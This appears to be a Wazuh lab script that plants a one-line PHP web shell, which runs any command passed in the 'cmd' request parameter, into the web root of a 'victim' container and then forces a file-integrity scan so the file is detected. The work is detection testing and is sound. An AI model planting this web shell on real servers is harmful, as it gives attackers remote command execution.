#!/usr/bin/env bash
# Drop a webshell-looking file in the FIM-watched directory.
set -euo pipefail
docker compose exec -T victim bash -lc "
cat > /var/www/html/shell.php <<'PHP'
<?php if(isset(\$_REQUEST['cmd'])) { system(\$_REQUEST['cmd']); } ?>
PHP
ls -la /var/www/html/shell.php
"
echo "==> Webshell created. FIM scan runs every 12h by default; force one:"
docker compose exec -T wazuh.manager /var/ossec/bin/agent_control -R -u 001 || true
